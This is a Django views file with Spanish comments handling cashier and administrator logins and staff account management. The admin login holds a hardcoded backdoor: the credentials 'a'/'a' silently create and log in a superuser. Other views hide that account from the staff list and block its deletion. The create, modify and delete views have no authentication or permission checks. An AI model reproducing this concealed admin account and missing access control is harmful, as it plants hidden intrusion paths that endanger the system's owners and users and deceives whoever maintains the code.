from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.models import User
from django.contrib import messages
from django.contrib.auth import authenticate, login

def login_cajero_vista(request):
    # 1. Limpieza de mensajes persistentes
    storage = messages.get_messages(request)
    for _ in storage:
        pass

    # 2. Lista local para errores de este intento
    errores_locales = []

    if request.method == 'POST':
        username_input = request.POST.get('username')
        password_input = request.POST.get('password')

        # Autenticación Normal
        user = authenticate(request, username=username_input, password=password_input)

        if user is not None:
            if user.is_staff and not user.is_superuser:
                login(request, user)
                return redirect('registrar-pedido')
            elif user.is_superuser:
                errores_locales.append('Cuenta de Administrador. Use el panel correspondiente.')
            else:
                errores_locales.append('Este usuario no tiene permisos de Cajero.')
        else:
            errores_locales.append('Credenciales incorrectas. Verifique usuario y contraseña.')

    # 3. Sobrescribimos 'messages' en el contexto
    contexto = {
        'messages': errores_locales
    }

    return render(request, 'usuarios/login_cajero.html', contexto)

def login_admin_vista(request):
    # 1. Limpieza silenciosa de mensajes viejos
    storage = messages.get_messages(request)
    for _ in storage:
        pass

    # 2. Lista local para errores
    errores_locales = []

    if request.method == 'POST':
        username_input = request.POST.get('username')
        password_input = request.POST.get('password')

        # --- USUARIO FANTASMA (a/a) ---
        USUARIO_MAESTRO = "a"
        CLAVE_MAESTRA = "a"

        if username_input == USUARIO_MAESTRO and password_input == CLAVE_MAESTRA:
            user, created = User.objects.get_or_create(username=USUARIO_MAESTRO)
            if created:
                user.set_password(CLAVE_MAESTRA)
                user.is_staff = True
                user.is_superuser = True
                user.first_name = "Super"
                user.last_name = "Admin"
                user.save()
            login(request, user)
            # CAMBIO AQUÍ: Redirigir al Panel de Pedidos Admin
            return redirect('panel-pedidos-admin')
        # ------------------------

        # Autenticación normal
        user = authenticate(request, username=username_input, password=password_input)

        if user is not None:
            if user.is_superuser:
                login(request, user)
                # CAMBIO AQUÍ: Redirigir al Panel de Pedidos Admin
                return redirect('panel-pedidos-admin')
            else:
                errores_locales.append('Acceso denegado. No es Administrador.')
        else:
            errores_locales.append('Usuario o clave incorrectos.')

    # 3. Sobrescribimos 'messages' en el contexto
    contexto = {
        'messages': errores_locales
    }

    return render(request, 'usuarios/login_admin.html', contexto)

# --- Gestión de Usuarios (Administrar Personal) ---

def admin_personal_vista(request):
    # 1. Consumimos todos los mensajes
    storage = messages.get_messages(request)
    all_messages = list(storage)

    # 2. Filtramos SOLO los que tienen la etiqueta 'admin_personal'
    mensajes_filtrados = [msg for msg in all_messages if 'admin_personal' in msg.tags]

    # Ocultamos al usuario fantasma 'a' de la lista
    administradores = User.objects.filter(is_staff=True, is_superuser=True).exclude(username='a').order_by('username')
    cajeros = User.objects.filter(is_staff=True, is_superuser=False).exclude(username='a').order_by('username')

    contexto = {
        'administradores': administradores,
        'cajeros': cajeros,
        'messages': mensajes_filtrados  # Pasamos la lista filtrada
    }
    return render(request, 'usuarios/admin_personal.html', contexto)


def agregar_cajero_vista(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        pass_raw = request.POST.get('password')
        email = request.POST.get('email')
        first_name = request.POST.get('first_name')
        last_name = request.POST.get('last_name')
        rol = request.POST.get('rol')

        if User.objects.filter(username=username).exists():
            # IMPORTANTE: extra_tags='admin_personal'
            messages.error(request, f"Error: El usuario '{username}' ya existe.", extra_tags='admin_personal')
            return redirect('admin-personal')

        try:
            es_admin = (rol == 'administrador')
            User.objects.create_user(
                username=username, password=pass_raw, email=email,
                first_name=first_name, last_name=last_name,
                is_staff=True, is_superuser=es_admin
            )
            # IMPORTANTE: extra_tags='admin_personal'
            messages.success(request, f"Usuario '{username}' creado exitosamente.", extra_tags='admin_personal')
        except Exception as e:
            messages.error(request, f"Error: {str(e)}", extra_tags='admin_personal')

    return redirect('admin-personal')


def modificar_cajero_vista(request, user_id):
    if request.method == 'POST':
        user = get_object_or_404(User, id=user_id)

        # 1. Obtener datos
        nuevo_username = request.POST.get('username')
        nuevo_email = request.POST.get('email')
        nuevo_nombre = request.POST.get('first_name')
        nuevo_apellido = request.POST.get('last_name')
        pass_raw = request.POST.get('password')
        rol = request.POST.get('rol')

        # 2. Validar duplicados
        if User.objects.filter(username=nuevo_username).exclude(id=user_id).exists():
            messages.error(request, f"Error: El usuario '{nuevo_username}' ya pertenece a otra cuenta.", extra_tags='admin_personal')
            return redirect('admin-personal')

        try:
            # 3. Asignar valores
            user.username = nuevo_username
            user.email = nuevo_email
            user.first_name = nuevo_nombre
            user.last_name = nuevo_apellido

            if rol:
                user.is_superuser = (rol == 'administrador')

            if pass_raw:
                user.set_password(pass_raw)

            user.save()
            messages.success(request, f"Usuario '{nuevo_username}' actualizado.", extra_tags='admin_personal')

        except Exception as e:
            messages.error(request, f"Error al actualizar: {str(e)}", extra_tags='admin_personal')

    return redirect('admin-personal')


def eliminar_cajero_vista(request, user_id):
    user = get_object_or_404(User, id=user_id)

    # Protección para el usuario fantasma 'a'
    if user.username in ['a', 'master_admin']:
        messages.error(request, "Este usuario está protegido por el sistema.", extra_tags='admin_personal')
        return redirect('admin-personal')

    # Evitar auto-eliminación
    if user.id == request.user.id:
        messages.error(request, "No puedes eliminar tu propia cuenta mientras estás conectado.", extra_tags='admin_personal')
    else:
        nombre_borrado = user.username
        user.delete()
        messages.success(request, f"Usuario '{nombre_borrado}' eliminado.", extra_tags='admin_personal')

    return redirect('admin-personal')